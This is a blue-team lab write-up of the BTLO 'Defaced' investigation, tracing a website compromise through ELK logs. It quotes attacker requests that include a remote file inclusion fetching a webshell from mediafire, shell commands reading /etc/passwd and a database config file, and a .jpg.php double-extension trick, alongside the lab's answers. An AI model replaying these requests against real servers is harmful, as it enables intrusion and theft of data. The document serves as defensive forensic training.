---
title: Defaced
module: 
path: Security Operations
platform: Blue Team Labs Online
tags: [ELK, Security Operations, Web Attack, Log Analysis, T1070.004, T1595.002, T1059.004]
status: 
date: 
date_completed: 
---
*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/defaced.png width="1500">
</p>

## Introduction

- [Defaced](https://blueteamlabs.online/home/investigation/defaced-593f17897e) -- BTLO investigation, Security Operations path
- Goal is reconstructing the full attack chain from scan to defacement to database exfiltration
- Techniques in scope: T1595.002 (vulnerability scanning), T1059.004 (Unix shell), T1070.004 (file deletion)
- Skills covered: Kibana Discover querying, fingerprinting a scanner without a user-agent field, tracing RFI to a webshell, correlating FIM alerts with web logs, timeline building

---

## Scenario

- Mike runs a young online pharmaceutical company selling personal health products
- Business grew fast, so he pushed developers to ship the website quickly and skipped security measures
- After go-live a threat actor defaced the site and stole all database records
- Post-incident, Mike took the server down, started security testing, and set up a log forwarder to a SIEM plus file integrity monitoring
- Artefacts provided on the Desktop: FIM1.JPG and FIM2.JPG (file integrity alerts), Before.JPG and After.JPG (homepage before and after)
- Task: hunt the root cause in ELK across logs from Feb 17 to Feb 18, 2021
- Bookmarked in the lab browser as [Discover - Elastic], or paste:

```
http://localhost:5601/app/discover#/?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:'2021-02-16T10:17:54.500Z',to:now))&_a=(columns:!(_source),filters:!(),index:'350867a0-729c-11eb-9d3d-8583953ebd4a',interval:auto,query:(language:kuery,query:''),sort:!())
```

---

**Important**

Every question has three parts. Extract them before touching Kibana.

- What kind of thing is the answer? (an IP, a filename, a timestamp, a tool name, a string)
- Which field holds that kind of thing?
- What do I already know that narrows it? (a known IP, a known time window, a prior answer)

**Notable scanners:**

- Nikto, Acunetix, Nessus, OpenVAS, sqlmap
- WPScan, Nuclei, ZAP, Burp, dirb/dirbuster
- gobuster, WhatWeb, Arachni, w3af, Skipfish
- Nmap NSE, masscan

---

## Investigation Submission

### 1. As an analyst, you need to submit details to the CTI team. What is the signature left by the threat actor that compromised the website? (2 points)

<p align="center">
<img src=screenshots/defaced-apash.png width="700">
</p>

- Opened Kibana and the JPG artefacts first to get an overview of all available evidence
- After.JPG is the defacement page, and the message on it is the signature left by the threat actor

**Answer: Team Apash Kirikiri 2.0**

---

### 2. The attacker deleted some files. What are they? (Alphabetical order based on filename) (2 points)

<p align="center">
<img src=screenshots/defaced-deleted.png width="700">
</p>

- The Investigation Files folder holding After.JPG also holds FIM1.JPG and FIM2.JPG
- FIM2.JPG has an events tab listing the file actions performed by the attacker
- Deleting web server logs is anti-forensics, T1070.004

**Answer: access_log, error_log**

---

### 3. What is the scanner used by the attacker to identify the vulnerability? (3 points)

<p align="center">
<img src=screenshots/defaced-nikto.png width="700">
</p>

- This index has no `agent` field, so the user-agent was never captured. The scanner has to be identified by behavior and payload instead
- Started by filtering on the attacker IP plus `response: 404` to isolate failed probes
- Hundreds of GET requests share the exact same timestamp. No human types that fast, so this is automated scanning
- The probes reuse one invented base filename across dozens of extensions, with a uniform 1,026-byte response every time. That is a tool baselining how the server responds to files that do not exist
- Tested the hypothesis against the common scanners:

```
"Burp Suite" or "ZAP" or "Nikto" or "sqlmap" or "nuclei"
```

- 52 hits, all Nikto. The tool signed its own work:

```
GET /MikePharmaSystem/modules.php?Nikto=http://cirt.net/rfiinc.txt?&file=article&sid=2
```

- `cirt.net` is Nikto's own domain and `rfiinc.txt` is its harmless RFI test file. The parameter is literally named `Nikto=`

Inline note:

- That probe returned 404, so Nikto's RFI attempt failed against `modules.php`. The scanner found the class of weakness, it did not land the exploit

**Answer: Nikto**

---

### 4. Which PHP page is vulnerable to Remote File Inclusion (RFI)? (2 points)

<p align="center">
<img src=screenshots/defaced-nikto.png width="700">
</p>

- Nikto tested for RFI using cirt.net and every one of those came back 404
- A successful RFI is response 200 and the included URL is not cirt.net
- Work with what you have, or in this case with what you do not have:

```
request: *=http* and not request: *cirt.net*
```

- That cuts the set to 12 hits, and the payloads are being pulled in through `getimagesonly.php`

Inline note, 11:40:34 is the recon-to-exploitation pivot:

- 11:40:34 and 11:40:37 -- `getimagesonly.php?u=` pulling a PNG from securityblue.team, 200, 497 bytes, twice
- 11:40:57 -- same page pulling the Google logo PNG, 200, 463 bytes
- Benign remote images first, then the payload at 11:41:34. The attacker validated the vulnerability by hand before weaponizing it, which is where the tool stops and the operator starts

**Answer: getimagesonly.php**

---

### 5. What is the IP address of the remote attacker? (3 points)

<p align="center">
<img src=screenshots/defaced-ip.png width="700">
</p>

- Every 404 in the entire index (15,033 of them) came from this single address
- The same IP threads the whole chain: the Nikto scan, the RFI attempts, the shell commands, and the phpMyAdmin session

**Answer: 91.192.103.35**

---

### 6. What is the name of the PHP shell? (2 points)

<p align="center">
<img src=screenshots/defaced-backdoor.png width="700">
</p>

- 11:41:34 -- `getimagesonly.php?u=http://download948.mediafire.com/006gsujji2ag/dxezgotjzptzfpv/webshell.php`, 200, 456 bytes
- 11:41:52 -- same page pulling `backdoor.jpg.php` from the same mediafire folder, 200, 450 bytes
- 11:41:53 and 11:41:57 -- `/MikePharmaSystem/assets/img/backdoor.jpg.php` responds locally, 200, 42,037 bytes
- 11:42:00 and 11:42:06 -- attacker requests `/file/dxezgotjzptzfpv/backdoor.jpg.php`, 404 twice. Wrong path, he is hunting for where his own file landed
- 11:42:32 -- re-included from a different mediafire token (`sxc9yaz9ds1g`), 200, 450 bytes
- 11:42:33 and 11:42:35 -- same local URL, now 1,240 bytes. The file on disk changed
- Commands only ever run against the 1,240-byte version, so that is the working shell

Inline notes:

- The double extension matters. Apache reads the last extension, so `.jpg.php` executes as PHP while looking like an image to a naive upload filter or to anyone skimming the directory
- What the 42,037-byte version was cannot be determined from access logs alone. It served twice, no commands followed, and it was replaced. Observation only, no conclusion

**Answer: backdoor.jpg.php**

---

### 7. The attacker downloaded the PHP shell from a file-hosting website. What is the name of the website? (2 points)

<p align="center">
<img src=screenshots/defaced-mediafire.png width="700">
</p>

- The hosting domain sits inside the inclusion parameter: `download948.mediafire.com`
- Same host and same second path segment across all three attempts, only the leading download token changed between `006gsujji2ag` and `sxc9yaz9ds1g`

**Answer: mediafire.com**

---

### 8. What time was the first command executed through the PHP shell? (3 points)

<p align="center">
<img src=screenshots/defaced-whoami.png width="700">
</p>

- 11:42:33 and 11:42:35 -- bare page loads of the shell, both 1,240 bytes, no parameters. Same URL and same byte count means the page rendered identically, so these are refreshes, not commands
- 11:42:44 -- `backdoor.jpg.php?c=whoami`, 200, 58 bytes
- `c=` is the command parameter, confirmed by the log rather than guessed. 58 bytes is consistent with a username as output

Inline note, the command sequence that follows is textbook orientation:

- 11:42:44 -- `c=whoami`, 58 bytes
- 11:43:14 -- `c=cat%20/etc/passwd`, 3,406 bytes
- 11:43:28 -- `c=pwd`, 94 bytes
- Who am I, what can I read, where am I. Thirty seconds of it

**Answer: 18/02/2021 11:42:44**

---

### 9. Which config file does the attacker attempt to read using the command 'cat'? (2 points)

<p align="center">
<img src=screenshots/defaced-config.png width="700">
</p>

- 11:43:14 -- first `cat` in the session is `/etc/passwd`, which is a user account file, not a config file. Keep walking the timeline
- 11:44:02 -- `c=cat%20/opt/lampp/htdocs/MikePharmaSystem/config.php`, 200, 420 bytes
- `%20` decodes to a space, so the command is `cat /opt/lampp/htdocs/MikePharmaSystem/config.php`

Inline note:

- This is the pivot from webshell to database. A CMS config file holds the DB credentials, and phpMyAdmin activity from the same IP starts roughly thirty seconds later

**Answer: /opt/lampp/htdocs/MikePharmaSystem/config.php**

---

### 10. At what time was the database dumped by the attacker? (2 points)

<p align="center">
<img src=screenshots/defaced-whoami.png width="700">
</p>

```
message: (*mysql* or *mysqldump* or *.sql*)
```

- 11:44:02 -- attacker reads the config file holding the DB credentials
- 11:44:36 and 11:44:50 -- `/phpmyadmin/db_structure.php?server=1&db=mysql`, both 200, both 10,674 bytes. Identical size on the same URL means the second is a reload, and `db=mysql` is phpMyAdmin's own system database, not the target. Nothing dumped yet

Pivoted the filter to read the whole phpMyAdmin session in order:

```
request: *phpmyadmin*
```

- 11:44:56 -- `db_structure.php?server=1&db=Mike_Pharmaceuticals`, 5,479 bytes. Now looking at the real target
- 11:44:59 -- `db_export.php?db=Mike_Pharmaceuticals`, 14,770 bytes

Inline notes:

- 11:45:07 -- POST to `/phpmyadmin/export.php`, 1,448 bytes. This is the only POST to phpMyAdmin in the log and it is the request that submits the export
- The eight-second gap between the export page loading and the POST is a human selecting format options, not a script
- The same session token (`2b432a225f4b40725f27604a4c423872`) appears throughout, so this is one authenticated phpMyAdmin session

**Answer: 18/02/2021 11:44:59**

---

### 11. The attacker exfiltrated the database records. What is the database name? (Just the name, without any extension) (2 points)

- The export request from the previous question carries the database name in the query string: `db=Mike_Pharmaceuticals`

**Answer: Mike_Pharmaceuticals**

---

## Closing Notes

- Clean end-to-end intrusion story: recon scan, RFI, webshell drop, hands-on-keyboard commands, database export, anti-forensics
- The question order roughly matches the attack order, so the timeline builds itself when working sequentially
- FIM alerts and web logs answer different halves of the same question, and neither is enough alone
- Byte count did more work in this lab than status code did. Two requests to the same URL, both 200, different sizes, meant the file on disk had been replaced
- Match the full path and not just the filename. `backdoor.jpg.php` appeared at two different paths and treating them as one artifact leads straight to a wrong conclusion about whether the attack succeeded
- Failed attacker requests are evidence in their own right. The 404s at 11:42:00 and 11:42:06 are the attacker debugging his own exploit in the victim's logs
- Good rep for pivoting in Kibana Discover instead of grepping flat files
